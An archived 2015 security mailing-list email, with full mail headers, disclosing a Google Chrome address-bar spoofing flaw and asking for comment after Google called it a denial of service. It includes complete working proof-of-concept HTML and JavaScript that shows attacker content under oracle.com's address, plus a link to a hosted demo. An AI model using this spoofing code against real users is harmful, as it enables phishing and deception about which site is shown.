X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1150" "Tuesday" "30" "June" "2015" "07:08:19" "+0100" "David Leo" "david.leo@deusen.co.uk" "<55923253.8020902@deusen.co.uk>" "47" "[oss-security] Google Chrome Address Spoofing (Request For Comment)" nil nil nil "6" "2015063006:08:19" "[oss-security] Google Chrome Address Spoofing (Request For Comment)" (number mark "        david.leo@de Jun 30   47/1150  " thread-indent "\"[oss-security] Google Chrome Address Spoofing (Request For Comment)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 13903 invoked by uid 550); 30 Jun 2015 06:12:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 11981 invoked from network); 30 Jun 2015 06:08:39 -0000
Message-ID: <55923253.8020902@deusen.co.uk>
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Thunderbird/31.1.1
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Date: Tue, 30 Jun 2015 07:08:19 +0100
From: David Leo <david.leo@deusen.co.uk>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Google Chrome Address Spoofing (Request For Comment)
To: bugtraq@securityfocus.com, fulldisclosure@seclists.org, 
 oss-security@lists.openwall.com

Impact:
The "click to verify" thing is completely broken...
Anyone can be "BBB Accredited Business" etc.
You can make whitehouse.gov display "We love Islamic State" :-)

Note:
No user interaction on the fake page.

Code:
***** index.html
<script>
function next()
{
	w.location.replace('http://www.oracle.com/index.html?'+n);n++;
	setTimeout("next();",15);
	setTimeout("next();",25);
}
function f()
{
	w=window.open("content.html","_blank","width=500 height=500");
	i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
}
</script>
<a href="#" onclick="f()">Go</a><br>
***** content.html
<b>This web page is NOT oracle.com</b>
<script>location="http://www.oracle.com/index.html";</script>
***** It's online
http://www.deusen.co.uk/items/gwhere.6128645971389012/
(The page says "June/16/2015" - it works as we tested today)

Request For Comment:
We reported this to Google.
They reproduced, and say
It's DoS which doesn't matter.
We think it's very strange,
since the browser does not crash(not DoS),
and the threat is obvious.
What's your opinion?

Kind Regards,

PS
We love clever tricks.
We love this:
http://dieyu.org/

